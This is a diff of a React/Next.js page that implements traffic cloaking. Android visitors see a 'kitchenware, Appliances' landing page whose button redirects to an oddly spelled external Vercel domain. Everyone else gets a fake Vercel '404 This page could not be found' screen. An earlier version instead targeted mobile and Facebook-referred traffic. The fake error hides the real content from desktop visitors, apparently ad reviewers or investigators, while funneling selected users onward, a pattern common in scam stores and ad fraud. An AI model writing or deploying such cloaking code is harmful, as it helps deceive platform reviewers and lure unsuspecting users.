@@ -1,167 +1,113 @@
 import { useEffect, useState } from "react";
 
 export default function Home() {
-  const [showWelcome, setShowWelcome] = useState(false);
-  const [checked, setChecked] = useState(false);
+  const [isAndroid, setIsAndroid] = useState(null);
 
   useEffect(() => {
-    const checkDeviceAndRender = () => {
-      const userAgent =
-        navigator.userAgent || navigator.vendor || window.opera || "";
+    const userAgent = navigator.userAgent || navigator.vendor || "";
 
-      const isMobileUA =
-        /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(
-          userAgent
-        );
+    // ONLY ANDROID
+    const android =
+      /Android/i.test(userAgent) &&
+      !/iPhone|iPad|iPod/i.test(userAgent);
 
-      const isFacebookTraffic =
-        /FBAN|FBAV|FB_IAB|FB4A|FBSS|Instagram/i.test(userAgent) ||
-        document.referrer.toLowerCase().includes("facebook") ||
-        document.referrer.toLowerCase().includes("fb") ||
-        window.location.search.includes("fbclid");
-
-      const isSmallWidth = window.innerWidth <= 768;
-
-      if (isMobileUA || isSmallWidth || isFacebookTraffic) {
-        document.title = "Welcome to kitchenware, Appliances";
-        setShowWelcome(true);
-      } else {
-        document.title = "404: NOT_FOUND";
-        setShowWelcome(false);
-      }
-
-      setChecked(true);
-    };
-
-    checkDeviceAndRender();
-
-    window.addEventListener("resize", checkDeviceAndRender);
-
-    return () => {
-      window.removeEventListener("resize", checkDeviceAndRender);
-    };
+    setIsAndroid(android);
   }, []);
 
   const redirectToStore = () => {
     window.location.replace("https://kichannwareteeen.vercel.app/");
   };
 
-  if (!checked) {
+  // Device check થવા સુધી કશું બતાવવું નહીં
+  if (isAndroid === null) {
     return null;
   }
 
-  return (
-    <>
-      {showWelcome ? (
-        <div className="mobile-landing-container">
-          <h1 className="landing-heading">
-            Welcome to
-            <br />
-            kitchenware,
-            <br />
-            Appliances
-          </h1>
-
-          <button
-            className="enter-btn"
-            onClick={redirectToStore}
-          >
-            Enter Site
-          </button>
-
-          <p className="subtext">
-            Premium Products &bull; Quality &bull; Style
-          </p>
-
-          <div className="redirect-status">
-            <div className="pulse-dot"></div>
-          </div>
-        </div>
-      ) : (
+  // Android સિવાયના બધા devices માટે 404
+  if (!isAndroid) {
+    return (
+      <>
         <div className="vercel-404-container">
           <div className="vercel-404-content">
             <div className="vercel-404-code">404</div>
+
             <div className="vercel-404-msg">
               This page could not be found.
             </div>
           </div>
         </div>
-      )}
+
+        <style jsx>{`
+          .vercel-404-container {
+            width: 100vw;
+            height: 100vh;
+            background: #000000;
+            color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            inset: 0;
+          }
+
+          .vercel-404-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          }
+
+          .vercel-404-code {
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 500;
+            padding-right: 23px;
+            margin-right: 20px;
+            border-right: 1px solid rgba(255, 255, 255, 0.3);
+            line-height: 49px;
+          }
+
+          .vercel-404-msg {
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            color: #eaeaea;
+          }
+        `}</style>
+      </>
+    );
+  }
+
+  // ONLY ANDROID WELCOME PAGE
+  return (
+    <>
+      <div className="mobile-landing-container">
+        <h1 className="landing-heading">
+          Welcome to
+          <br />
+          kitchenware,
+          <br />
+          Appliances
+        </h1>
+
+        <button
+          className="enter-btn"
+          onClick={redirectToStore}
+        >
+          Enter Site
+        </button>
+
+        <p className="subtext">
+          Premium Products &bull; Quality &bull; Style
+        </p>
+
+        <div className="redirect-status">
+          <div className="pulse-dot"></div>
+        </div>
+      </div>
 
       <style jsx>{`
         * {
-          margin: 0;
-          padding: 0;
           box-sizing: border-box;
-          font-family:
-            Inter,
-            -apple-system,
-            BlinkMacSystemFont,
-            "Segoe UI",
-            Roboto,
-            Oxygen,
-            Ubuntu,
-            Cantarell,
-            sans-serif;
         }
-
-        html,
-        body {
-          width: 100%;
-          height: 100%;
-          overflow-x: hidden;
-          background-color: #000000;
-        }
-
-        /* DESKTOP 404 */
-
-        .vercel-404-container {
-          display: flex;
-          width: 100vw;
-          height: 100vh;
-          background-color: #000000;
-          color: #ffffff;
-          align-items: center;
-          justify-content: center;
-          flex-direction: column;
-          font-family:
-            system-ui,
-            -apple-system,
-            BlinkMacSystemFont,
-            "Segoe UI",
-            Roboto,
-            "Helvetica Neue",
-            sans-serif;
-          position: fixed;
-          top: 0;
-          left: 0;
-          z-index: 99999;
-        }
-
-        .vercel-404-content {
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          height: 40px;
-        }
-
-        .vercel-404-code {
-          font-size: 24px;
-          font-weight: 500;
-          padding-right: 23px;
-          margin-right: 20px;
-          border-right: 1px solid rgba(255, 255, 255, 0.3);
-          line-height: 49px;
-        }
-
-        .vercel-404-msg {
-          font-size: 14px;
-          font-weight: 400;
-          line-height: 49px;
-          color: #eaeaea;
-        }
-
-        /* MOBILE WELCOME */
 
         .mobile-landing-container {
           display: flex;
@@ -175,20 +121,17 @@ export default function Home() {
           padding: 24px;
           text-align: center;
           position: fixed;
-          top: 0;
-          left: 0;
-          right: 0;
-          bottom: 0;
-          z-index: 10000;
+          inset: 0;
         }
 
         .landing-heading {
+          font-family: Inter, Arial, sans-serif;
           font-size: 32px;
           font-weight: 700;
           color: #262626;
           line-height: 1.25;
           letter-spacing: -0.5px;
-          margin-bottom: 40px;
+          margin: 0 0 40px;
           max-width: 320px;
         }
 
@@ -198,17 +141,16 @@ export default function Home() {
           justify-content: center;
           background-color: #363636;
           color: #ffffff;
+          font-family: Inter, Arial, sans-serif;
           font-size: 16px;
           font-weight: 600;
           padding: 16px 48px;
+          min-width: 250px;
           border-radius: 9999px;
           border: none;
           cursor: pointer;
-          text-decoration: none;
           box-shadow: 0 4px 14px rgba(0, 0, 0, 0.12);
           transition: all 0.2s ease;
-          margin-bottom: 40px;
-          outline: none;
           -webkit-tap-highlight-color: transparent;
         }
 
@@ -218,19 +160,16 @@ export default function Home() {
         }
 
         .subtext {
+          font-family: Inter, Arial, sans-serif;
           font-size: 13px;
           font-weight: 500;
           color: #757575;
           letter-spacing: 0.2px;
+          margin: 40px 0 0;
         }
 
         .redirect-status {
           margin-top: 20px;
-          font-size: 12px;
-          color: #999999;
-          display: flex;
-          align-items: center;
-          gap: 6px;
         }
 
         .pulse-dot {
